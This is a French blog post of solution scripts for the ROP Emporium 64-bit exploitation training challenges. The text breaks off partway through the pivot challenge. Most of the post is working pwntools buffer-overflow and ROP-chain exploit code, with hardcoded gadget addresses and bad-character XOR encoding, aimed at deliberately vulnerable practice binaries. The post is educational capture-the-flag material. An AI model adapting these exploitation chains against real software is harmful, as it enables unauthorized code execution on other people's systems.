+            <span class="p-author h-card" itemprop="name">kik0u7</span></span></p>
+      
+      
+          <h2>Table of content</h2>
+          <div id="table-of-contents">
+              <ul class="section-nav">
+<li class="toc-entry toc-h1"><a href="#ret2win">ret2win</a></li>
+<li class="toc-entry toc-h1"><a href="#split">split</a></li>
+<li class="toc-entry toc-h1"><a href="#callme">callme</a></li>
+<li class="toc-entry toc-h1"><a href="#write4">write4</a></li>
+<li class="toc-entry toc-h1"><a href="#badchars">badchars</a></li>
+<li class="toc-entry toc-h1"><a href="#fluff">fluff</a></li>
+<li class="toc-entry toc-h1"><a href="#pivot">pivot</a></li>
+<li class="toc-entry toc-h1"><a href="#ret2csu">ret2csu</a></li>
+</ul>
+          </div>
+      
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h1 class="no_toc">Context</h1>
+
+<p>Vous retrouverez mes scripts permettant de résoudre chacune des ROP présente dans la catégorie 64bits de ROP Emporium.</p>
+
+<p>Les <em>scripts</em> présent ici ont été <em>testés</em> sur la version <strong>Juillet 2020</strong> des challenges</p>
+
+<h1 id="ret2win">ret2win</h1>
+
+<blockquote>
+  <p><em>Locate a method within the binary that you want to call and do so by overwriting a saved return address on the stack.</em></p>
+</blockquote>
+
+<p>Le binaire est disponible sur le site officiel, <a href="https://ropemporium.com/challenge/ret2win.html">ici</a></p>
+
+<h4 id="solution">solution</h4>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./ret2win'</span><span class="p">)</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
+
+<span class="n">addr_ret2win</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">ret2win</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="s">b'A'</span> <span class="o">*</span> <span class="mi">40</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_ret2win</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">b'&gt; '</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h1 id="split">split</h1>
+
+<blockquote>
+  <p><em>In this challenge the elements that allowed you to complete the ret2win challenge are still present, they’ve just been split apart. Find them and recombine them using a short ROP chain.</em></p>
+</blockquote>
+
+<p>Le binaire est disponible sur le site officiel, <a href="https://ropemporium.com/challenge/split.html">ici</a></p>
+
+<h4 id="solution-1">solution</h4>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./split"</span><span class="p">)</span>
+
+
+<span class="n">addr_system</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400560</span><span class="p">)</span>
+<span class="n">addr_bincatflag</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x601060</span><span class="p">)</span>
+<span class="n">addr_gadget_pop</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004007c3</span><span class="p">)</span>
+
+
+<span class="n">padding</span> <span class="o">=</span> <span class="s">b'A'</span> <span class="o">*</span> <span class="mi">40</span>
+
+<span class="n">rop</span> <span class="o">=</span> <span class="n">addr_gadget_pop</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">addr_bincatflag</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">addr_system</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">rop</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">b'&gt; '</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h1 id="callme">callme</h1>
+
+<blockquote>
+  <p><em>Reliably make consecutive calls to imported functions. Use some new techniques and learn about the Procedure Linkage Table.</em></p>
+</blockquote>
+
+<p>Le binaire est disponible sur le site officiel, <a href="https://ropemporium.com/challenge/callme.html">ici</a></p>
+
+<h4 id="solution-2">solution</h4>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./callme'</span><span class="p">)</span> 
+<span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
+
+<span class="n">addr_call1</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">callme_one</span><span class="p">)</span>
+<span class="n">addr_call2</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">callme_two</span><span class="p">)</span>
+<span class="n">addr_call3</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">callme_three</span><span class="p">)</span>
+
+<span class="n">addr_arg1</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span>
+<span class="n">addr_arg2</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabecafebabe</span><span class="p">)</span>
+<span class="n">addr_arg3</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xd00df00dd00df00d</span><span class="p">)</span>
+
+<span class="c1"># 0x000000000040093c: pop rdi; pop rsi; pop rdx; ret; 
+</span><span class="n">addr_pop_arg_1_2_3</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040093c</span><span class="p">)</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="s">b'A'</span><span class="o">*</span><span class="mi">40</span>
+
+<span class="n">rop</span> <span class="o">=</span> <span class="n">addr_pop_arg_1_2_3</span> <span class="o">+</span> <span class="n">addr_arg1</span> <span class="o">+</span> <span class="n">addr_arg2</span> <span class="o">+</span> <span class="n">addr_arg3</span> <span class="o">+</span> <span class="n">addr_call1</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">addr_pop_arg_1_2_3</span> <span class="o">+</span> <span class="n">addr_arg1</span> <span class="o">+</span> <span class="n">addr_arg2</span> <span class="o">+</span> <span class="n">addr_arg3</span> <span class="o">+</span> <span class="n">addr_call2</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">addr_pop_arg_1_2_3</span> <span class="o">+</span> <span class="n">addr_arg1</span> <span class="o">+</span> <span class="n">addr_arg2</span> <span class="o">+</span> <span class="n">addr_arg3</span> <span class="o">+</span> <span class="n">addr_call3</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">rop</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h1 id="write4">write4</h1>
+
+<blockquote>
+  <p><em>Our first foray into proper gadget use. A useful function is still present but we’ll need to write a string into memory somehow.</em></p>
+</blockquote>
+
+<p>Le binaire est disponible sur le site officiel, <a href="https://ropemporium.com/challenge/write4.html">ici</a></p>
+
+<h4 id="solution-3">solution</h4>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./write4'</span><span class="p">)</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
+
+<span class="c1">### ADDRESS WRITE ###
+</span><span class="n">addr_write</span> <span class="o">=</span> <span class="mh">0x0000000000601500</span>
+
+<span class="c1">### GADGET ###
+# 0x0000000000400628: mov qword ptr [r14], r15; ret; 
+</span><span class="n">gadget_mov</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400628</span><span class="p">)</span>
+
+<span class="c1"># 0x0000000000400690: pop r14; pop r15; ret; 
+</span><span class="n">gadget_pop_r14_r15</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400690</span><span class="p">)</span>
+
+<span class="c1"># 0x0000000000400693: pop rdi; ret; 
+</span><span class="n">gadget_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400693</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">write_rop</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
+    <span class="n">old_size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">old_size</span> <span class="o">%</span> <span class="mi">8</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">string</span> <span class="o">=</span> <span class="n">string</span><span class="o">+</span><span class="s">b'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="p">(</span><span class="n">old_size</span><span class="o">%</span><span class="mi">8</span><span class="p">))</span>
+    
+    <span class="n">array_str</span> <span class="o">=</span> <span class="p">[</span> <span class="n">string</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span> <span class="p">:</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span><span class="o">//</span><span class="mi">8</span><span class="p">)]</span>
+
+    <span class="n">rop</span> <span class="o">=</span> <span class="s">b''</span>
+    <span class="k">for</span> <span class="n">offset</span><span class="p">,</span> <span class="n">eight</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">array_str</span><span class="p">):</span>
+        <span class="n">rop</span> <span class="o">+=</span> <span class="n">gadget_pop_r14_r15</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_write</span> <span class="o">+</span> <span class="n">offset</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">eight</span>
+        <span class="n">rop</span> <span class="o">+=</span> <span class="n">gadget_mov</span>
+
+    <span class="k">return</span> <span class="n">rop</span>
+
+<span class="c1">#######
+</span><span class="n">addr_print_file</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">print_file</span><span class="p">)</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="s">b'A'</span> <span class="o">*</span> <span class="mi">40</span>
+
+<span class="n">rop</span> <span class="o">=</span> <span class="n">write_rop</span><span class="p">(</span><span class="s">b'/etc/fstab'</span><span class="p">)</span>
+
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">gadget_rdi</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_write</span><span class="p">)</span> <span class="o">+</span> <span class="n">addr_print_file</span>
+
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">rop</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">b'&gt; '</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h1 id="badchars">badchars</h1>
+
+<blockquote>
+  <p><em>An arbitrary write challenge with a twist; certain input characters get mangled as they make their way onto the stack. Find a way to deal with this and craft your exploit.</em></p>
+</blockquote>
+
+<p>Le binaire est disponible sur le site officiel, <a href="https://ropemporium.com/challenge/write4.html">ici</a></p>
+
+<h4 id="solution-4">solution</h4>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./badchars"</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">gadget_pop</span><span class="p">(</span><span class="n">r12</span><span class="p">,</span> <span class="n">r13</span><span class="p">,</span> <span class="n">r14</span><span class="p">,</span> <span class="n">r15</span><span class="p">):</span>
+    <span class="c1"># 0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret; 
+</span>    <span class="n">gadget_pop_r12_r13_r14_r15</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040069c</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">gadget_pop_r12_r13_r14_r15</span> <span class="o">+</span> <span class="n">r12</span> <span class="o">+</span> <span class="n">r13</span> <span class="o">+</span> <span class="n">r14</span> <span class="o">+</span> <span class="n">r15</span>
+
+
+<span class="c1">##### Écrire en mémoire #####
+# 0x0000000000400634: mov qword ptr [r13], r12; ret; 
+</span><span class="n">gadget_mov</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400634</span><span class="p">)</span>
+
+
+<span class="c1">##### Modfier les badchars
+# 0x0000000000400628: xor byte ptr [r15], r14b; ret; 
+</span><span class="n">gadget_xor</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400628</span><span class="p">)</span>
+
+
+<span class="c1">#### Appel de la fonction print_flag
+# 0x00000000004006a3: pop rdi; ret; 
+</span><span class="n">gadget_pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004006a3</span><span class="p">)</span>
+
+<span class="c1">#### Adresse dans .bss (aka ou je peux écrire) 
+</span><span class="n">addr_write</span> <span class="o">=</span> <span class="mh">0x0000000000601042</span>
+
+
+<span class="k">def</span> <span class="nf">bad_rop</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">bad</span><span class="p">):</span>
+    <span class="n">bad_rop</span> <span class="o">=</span> <span class="s">b''</span>
+    <span class="n">xor_key</span> <span class="o">=</span> <span class="mh">0xde</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+        <span class="n">addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_write</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="n">offset</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="ow">in</span> <span class="n">bad</span><span class="p">:</span>
+            <span class="n">bad_rop</span> <span class="o">+=</span> <span class="n">gadget_pop</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">),</span> <span class="n">addr</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">xor_key</span><span class="p">),</span> <span class="n">addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">gadget_mov</span> <span class="o">+</span> <span class="n">gadget_xor</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">bad_rop</span> <span class="o">+=</span> <span class="n">gadget_pop</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span> <span class="n">addr</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">),</span> <span class="n">addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">gadget_mov</span>
+    <span class="k">return</span> <span class="n">bad_rop</span>
+
+
+<span class="k">def</span> <span class="nf">good_rop</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">gadget_pop</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_write</span> <span class="o">+</span> <span class="n">offset</span> <span class="o">*</span> <span class="mi">8</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="o">+</span> <span class="n">gadget_mov</span>
+
+
+<span class="k">def</span> <span class="nf">bad_in</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">badchars</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">bad</span> <span class="ow">in</span> <span class="n">badchars</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">bad</span> <span class="ow">in</span> <span class="n">b</span><span class="p">:</span>
+            <span class="k">return</span> <span class="bp">True</span>
+    <span class="k">return</span> <span class="bp">False</span>
+
+
+<span class="k">def</span> <span class="nf">rop_chain</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
+    <span class="n">badcahars</span> <span class="o">=</span> <span class="s">b'agx.'</span>
+    <span class="n">len_b</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+    
+    <span class="k">if</span> <span class="n">len_b</span><span class="o">%</span><span class="mi">8</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">b</span> <span class="o">=</span> <span class="n">b</span> <span class="o">+</span> <span class="s">b'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="p">(</span><span class="n">len_b</span><span class="o">%</span><span class="mi">8</span><span class="p">))</span>
+
+    <span class="n">array_b</span> <span class="o">=</span> <span class="p">[</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">:(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span><span class="p">)</span> <span class="p">]</span>
+
+    <span class="n">rop</span> <span class="o">=</span> <span class="s">b''</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">array_b</span><span class="p">)):</span>
+        <span class="k">if</span> <span class="n">bad_in</span><span class="p">(</span><span class="n">array_b</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">badcahars</span><span class="p">):</span>
+            <span class="n">rop</span> <span class="o">+=</span> <span class="n">bad_rop</span><span class="p">(</span><span class="n">array_b</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">i</span><span class="p">,</span> <span class="n">badcahars</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">rop</span> <span class="o">+=</span> <span class="n">good_rop</span><span class="p">(</span><span class="n">array_b</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">i</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">rop</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">addr_printfile</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">print_file</span><span class="p">)</span>
+
+    <span class="n">padding</span> <span class="o">=</span> <span class="s">b'A'</span> <span class="o">*</span> <span class="mi">40</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">rop_chain</span><span class="p">(</span><span class="s">b'flag.txt'</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">gadget_pop_rdi</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_write</span><span class="p">)</span> <span class="o">+</span> <span class="n">addr_printfile</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">b'&gt; '</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h1 id="fluff">fluff</h1>
+
+<blockquote>
+  <p><em>The concept here is identical to the write4 challenge. The only difference is we may struggle to find gadgets that will get the job done. However if we take our time to consider all our options, we’ll succeed.</em></p>
+</blockquote>
+
+<p>Le binaire est disponible sur le site officiel, <a href="https://ropemporium.com/challenge/fluff.html">ici</a></p>
+
+<h4 id="solution-5">solution</h4>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./fluff'</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
+
+<span class="c1"># 0x0000000000400639: stosb byte ptr [rdi], al; ret; 
+</span><span class="n">gadget_stosb</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400639</span><span class="p">)</span>
+
+<span class="c1"># 0x00000000004006a3: pop rdi; ret; 
+</span><span class="n">gadget_pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004006a3</span><span class="p">)</span>
+
+<span class="c1"># 0x0000000000400628: xlatb; ret; 
+</span><span class="n">gadget_xlatb</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400628</span><span class="p">)</span>
+
+<span class="c1"># 0x000000000040062a: pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret; 
+</span><span class="n">gadget_bextr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040062a</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">search_string</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
+    <span class="n">offsets</span> <span class="o">=</span> <span class="nb">list</span><span class="p">()</span>
+    <span class="n">chars</span> <span class="o">=</span> <span class="nb">list</span><span class="p">()</span>
+
+    <span class="k">for</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">string</span><span class="p">:</span>
+        <span class="n">offsets</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">val</span><span class="p">.</span><span class="n">encode</span><span class="p">())))</span>
+        <span class="n">chars</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">offsets</span><span class="p">,</span> <span class="n">chars</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">padding</span> <span class="o">=</span> <span class="s">b'A'</span> <span class="o">*</span> <span class="mi">40</span>
+    <span class="n">print_file</span> <span class="o">=</span> <span class="n">gadget_pop_rdi</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000601450</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">print_file</span><span class="p">)</span>
+    <span class="n">fileopen</span> <span class="o">=</span> <span class="s">"flag.txt"</span>
+
+    <span class="n">flag_txt_off</span><span class="p">,</span> <span class="n">flag_txt_chr</span> <span class="o">=</span> <span class="n">search_string</span><span class="p">(</span><span class="n">fileopen</span><span class="p">)</span>
+
+    <span class="n">rop</span> <span class="o">=</span> <span class="s">b''</span>
+    <span class="n">rax</span> <span class="o">=</span> <span class="mh">0xb</span>
+    
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">fileopen</span><span class="p">)):</span>
+        <span class="k">if</span> <span class="n">i</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">rax</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">flag_txt_chr</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+
+        <span class="n">rop</span> <span class="o">+=</span> <span class="n">gadget_bextr</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mb">0b10000000_00000000</span><span class="p">)</span>
+        <span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">flag_txt_off</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x3ef2</span> <span class="o">-</span> <span class="n">rax</span><span class="p">)</span> 
+        <span class="n">rop</span> <span class="o">+=</span> <span class="n">gadget_xlatb</span>
+        <span class="n">rop</span> <span class="o">+=</span> <span class="n">gadget_pop_rdi</span> 
+        <span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000601450</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> 
+        <span class="n">rop</span> <span class="o">+=</span> <span class="n">gadget_stosb</span>
+    
+    
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">rop</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">print_file</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h1 id="pivot">pivot</h1>
+
+<blockquote>
+  <p><em>There’s only enough space for a small ROP chain on the stack, but you’ve been given space to stash a much larger chain elsewhere. Learn how to pivot the stack onto a new location.</em></p>
+</blockquote>
+
+<p>Le binaire est disponible sur le site officiel, <a href="https://ropemporium.com/challenge/pivot.html">ici</a></p>
+
+<h4 id="solution-6">solution</h4>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./pivot'</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>
+<span class="n">libpivot</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libpivot.so'</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
+
+<span class="c1"># gdb.attach(target.proc.pid, 'b*pwnme')
+</span>
+<span class="c1">### GADGET ###
